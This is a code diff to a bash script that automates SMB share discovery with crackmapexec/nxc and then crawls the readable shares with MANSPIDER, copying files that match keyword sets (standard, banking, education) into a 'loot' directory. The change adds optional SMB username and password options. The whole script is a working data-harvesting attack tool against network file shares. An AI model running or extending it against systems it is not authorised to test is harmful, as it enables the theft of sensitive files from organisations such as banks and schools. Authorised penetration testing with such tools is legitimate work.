@@ -13,17 +13,14 @@ DEFAULT_LOOT_DIR="$HOME/manspider_loot"
 
 # Usage help function
 usage() {
-    echo "Usage: $0 -i <ip_range_file> [-l <loot_dir>] [-e <extensions>] [-k <keyword_set>]"
+    echo "Usage: $0 -i <ip_range_file> [-l <loot_dir>] [-e <extensions>] [-k <keyword_set>] [-u <username>] [-p <password>]"
     echo "Options:"
     echo "  -i <file>      Path to file containing IP ranges (required)"
     echo "  -l <dir>       Directory to store looted files (default: $DEFAULT_LOOT_DIR)"
     echo "  -e <exts>      Space-separated file extensions to search (default: $DEFAULT_EXTENSIONS)"
     echo "  -k <set>       Keyword set: A (standard), B (banking), C (education), or custom keywords (default: A)"
-    echo "                 Examples:"
-    echo "                   -k A  : Standard keywords ($KEYWORDS_A)"
-    echo "                   -k B  : Banking keywords ($KEYWORDS_B)"
-    echo "                   -k C  : Education keywords ($KEYWORDS_C)"
-    echo "                   -k \"custom keywords\" : Custom space-separated keywords"
+    echo "  -u <username>  SMB username (optional)"
+    echo "  -p <password>  SMB password (optional)"
     echo "  -h, -help      Show this help message"
     exit 1
 }
@@ -34,30 +31,30 @@ if [[ "$1" == "-help" || "$1" == "--help" ]]; then
 fi
 
 # Parse command-line arguments
-while getopts "i:l:e:k:h" opt; do
+while getopts "i:l:e:k:u:p:h" opt; do
     case "$opt" in
         i) IP_FILE="$OPTARG" ;;
         l) LOOT_DIR="$OPTARG" ;;
         e) EXTENSIONS="$OPTARG" ;;
         k) KEYWORD_SET="$OPTARG" ;;
+        u) USERNAME="$OPTARG" ;;
+        p) PASSWORD="$OPTARG" ;;
         h) usage ;;
         ?) usage ;;
     esac
 done
 
-# Check if IP file was provided
+# Check required args
 if [ -z "$IP_FILE" ]; then
     echo "Error: IP range file is required (-i)"
     usage
 fi
 
-# Validate IP file exists
 if [ ! -f "$IP_FILE" ]; then
     echo "Error: File not found: $IP_FILE"
     exit 1
 fi
 
-# Set defaults if not provided
 LOOT_DIR="${LOOT_DIR:-$DEFAULT_LOOT_DIR}"
 EXTENSIONS="${EXTENSIONS:-$DEFAULT_EXTENSIONS}"
 
@@ -66,26 +63,28 @@ case "$KEYWORD_SET" in
     "A"|"a"|"") KEYWORDS="$KEYWORDS_A" ;;  # Default to A if unspecified
     "B"|"b") KEYWORDS="$KEYWORDS_B" ;;
     "C"|"c") KEYWORDS="$KEYWORDS_C" ;;
-    *) KEYWORDS="$KEYWORD_SET" ;;  # Anything else is treated as custom keywords
+    *) KEYWORDS="$KEYWORD_SET" ;;  # Custom
 esac
+
+# Prepare credentials
+CME_AUTH_ARGS=("-u" "${USERNAME:-''}" "-p" "${PASSWORD:-''}")
+MS_AUTH_ARGS=()
+[ -n "$USERNAME" ] && MS_AUTH_ARGS+=("-u" "$USERNAME")
+[ -n "$PASSWORD" ] && MS_AUTH_ARGS+=("-p" "$PASSWORD")
 
 # Define output file for discovered hosts
 OUTPUT_FILE="spider-hosts.txt"
-
-# Clear previous output file
 > "$OUTPUT_FILE"
 
 # Step 1: Scan for accessible SMB shares
 echo "Scanning IP ranges from $IP_FILE for accessible SMB shares..."
 while IFS= read -r ip_range; do
     echo "Scanning $ip_range..."
-    crackmapexec smb "$ip_range" -u '' -p '' --shares | awk '/READ|WRITE/ && !/READONLY/ {print $2}' >> "$OUTPUT_FILE"
+    nxc smb "$ip_range" "${CME_AUTH_ARGS[@]}" --shares | awk '/READ|WRITE/ && !/READONLY/ {print $2}' >> "$OUTPUT_FILE"
 done < "$IP_FILE"
 
-# Remove duplicates from the host list
 sort -u "$OUTPUT_FILE" -o "$OUTPUT_FILE"
 
-# Check if any hosts were found
 if [ ! -s "$OUTPUT_FILE" ]; then
     echo "No accessible SMB shares found. Exiting."
     exit 0
@@ -93,12 +92,11 @@ fi
 
 echo "Found $(wc -l < "$OUTPUT_FILE") hosts with accessible SMB shares. Starting spidering..."
 
-# Step 2: Spider the shares with MANSPIDER
 mkdir -p "$LOOT_DIR"
 
 while IFS= read -r ip; do
     echo "Spidering $ip with keywords: $KEYWORDS..."
-    manspider -t 20 "$ip" -l "$LOOT_DIR" -f "$KEYWORDS" -e "$EXTENSIONS"
+    manspider -t 20 "$ip" -l "$LOOT_DIR" -f "$KEYWORDS" -e "$EXTENSIONS" "${MS_AUTH_ARGS[@]}"
 done < "$OUTPUT_FILE"
 
 echo "Spidering complete. Loot saved to $LOOT_DIR"
